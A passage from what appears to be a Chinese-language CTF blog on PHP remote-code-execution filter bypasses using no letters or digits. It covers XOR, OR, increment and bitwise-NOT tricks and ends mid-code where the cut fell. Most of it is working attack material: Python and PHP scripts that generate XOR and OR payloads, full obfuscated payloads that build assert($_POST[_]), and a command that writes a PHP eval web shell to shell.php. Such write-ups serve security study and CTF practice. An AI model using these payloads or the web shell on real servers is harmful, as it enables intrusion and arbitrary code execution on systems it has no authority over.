                <span class="comment">#print(i)</span></span><br><span class="line">                   s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                   s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                   <span class="keyword">break</span></span><br><span class="line">           f.close()</span><br><span class="line">       output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">       <span class="keyword">return</span>(output)</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">       <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令行运行:php yihuo.php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>都是异或脚本</p><p>例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//简单例题，flag再phpinfo()中，需要执行php命令：phpinfo();</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$mess</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$mess</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$mess</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//构造payload,字符串phpinfo异或结果为&quot;0302181&quot;^&quot;@[@[_^^&quot;</span></span><br><span class="line"> </span><br><span class="line">mess=<span class="variable">$_</span>=<span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure><h3 id="或绕过"><a href="#或绕过" class="headerlink" title="或绕过"></a>或绕过</h3><p>原理和异或绕过类似，只不过用的是|运算符。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">hex_i = <span class="string">&quot;&quot;</span></span><br><span class="line">hex_j = <span class="string">&quot;&quot;</span></span><br><span class="line">pattern=<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>   <span class="comment">#正则过滤的内容</span></span><br><span class="line">str1=[<span class="string">&quot;system&quot;</span>,<span class="string">&quot;dir&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    t1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    t2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> str1[p]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(i)) :</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> re.search(pattern,<span class="built_in">chr</span>(j)) :</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_i=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">if</span> j &lt; <span class="number">16</span>:</span><br><span class="line">                    hex_j=<span class="string">&quot;0&quot;</span>+<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hex_j=<span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                hex_i=<span class="string">&#x27;%&#x27;</span>+hex_i</span><br><span class="line">                hex_j=<span class="string">&#x27;%&#x27;</span>+hex_j</span><br><span class="line">                c=<span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i))|<span class="built_in">ord</span>(urllib.parse.unquote(hex_j)))</span><br><span class="line">                <span class="keyword">if</span>(c ==k):</span><br><span class="line">                    t1=t1+hex_i</span><br><span class="line">                    t2=t2+hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(\&quot;&quot;</span>+t1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+t2+<span class="string">&quot;\&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3><p>在编程中，自增操作是指将一个变量的值增加1</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$number</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$number</span>++;  <span class="comment">// 自增操作</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$number</span>;  <span class="comment">// 输出 11</span></span><br></pre></td></tr></table></figure><p>自增操作也可以应用于字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$letter = &#x27;a&#x27;;</span><br><span class="line">$letter++;  // 自增操作</span><br><span class="line">echo $letter;  // 输出 &#x27;b&#x27;</span><br></pre></td></tr></table></figure><p>‘a’++ &#x3D;&gt; ‘b’，’b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//测试发现7.0.12以上版本不可使用</span><br><span class="line">//使用时需要url编码下</span><br><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br><span class="line">固定格式 构造出来的 assert($_POST[_]);</span><br><span class="line">然后post传入   _=phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一样的：</span><br><span class="line">&lt;?php</span><br><span class="line">$_=[].&#x27;&#x27;;   //得到&quot;Array&quot;</span><br><span class="line">$___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span><br><span class="line">$__ = $___;   //$__=&quot;A&quot;</span><br><span class="line">$_ = $___;   //$_=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;AS&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASS&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;   //得到&quot;E&quot;，此时$__=&quot;E&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSE&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到&quot;R&quot;，此时$__=&quot;R&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSER&quot;</span><br><span class="line">$__++;$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="line">$___ .= $__;   //$___=&quot;ASSERT&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$____ = &quot;_&quot;;   //$____=&quot;_&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;P&quot;，此时$__=&quot;P&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_P&quot;</span><br><span class="line">$__ = $_;   //$__=&quot;A&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到&quot;O&quot;，此时$__=&quot;O&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_PO&quot;</span><br><span class="line">$__++;$__++;$__++;$__++;   //得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_POS&quot;</span><br><span class="line">$__++;   //得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="line">$____ .= $__;   //$____=&quot;_POST&quot;</span><br><span class="line">$_ = $$____;   //$_=$_POST</span><br><span class="line">$___($_[_]);   //ASSERT($POST[_])</span><br></pre></td></tr></table></figure><h3 id="输出重定向："><a href="#输出重定向：" class="headerlink" title="输出重定向："></a>输出重定向：</h3><p><img src="https://bu.dusays.com/2024/05/13/664161cf568c7.png" alt="image-20240329223733390"></p><p>可以写马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &quot;&lt;?php @eval(\$_POST[&#x27;test&#x27;]);?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure><h2 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE"></a>无字母数字RCE</h2><p>[工具](<a href="https://github.com/ProbiusOfficial/bashFuck">ProbiusOfficial&#x2F;bashFuck: exec BashCommand with only ! # $ ‘ ( ) &lt; \ { } just 10 charset used in Bypass or CTF (github.com)</a>)</p><h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>异或、取反、自增、临时文件上传；都可以</strong></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</p><p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境</p><h4 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h4><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行<strong>异或</strong>操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>其实很像自增的感觉</p><p><img src="https://bu.dusays.com/2024/05/13/664161d2c756d.png" alt="image-20240331113232883"></p><h4 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h4><p><strong>取反</strong></p><p>用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ceb2bb5.png" alt="image-20240331113325366"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d2cb76a.png" alt="image-20240331113423181"></p><p><strong>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。</strong></p><h4 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h4><p><strong>自增</strong></p><p><img src="https://bu.dusays.com/2024/05/13/664161ce2bcf0.png" alt="image-20240331113605706"></p><p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ceb9709.png" alt="image-20240331113652179"></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d2ef00f.png" alt="image-20240331113925903"></p><h3 id="例2-进阶-："><a href="#例2-进阶-：" class="headerlink" title="例2(进阶)："></a>例2(进阶)：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span 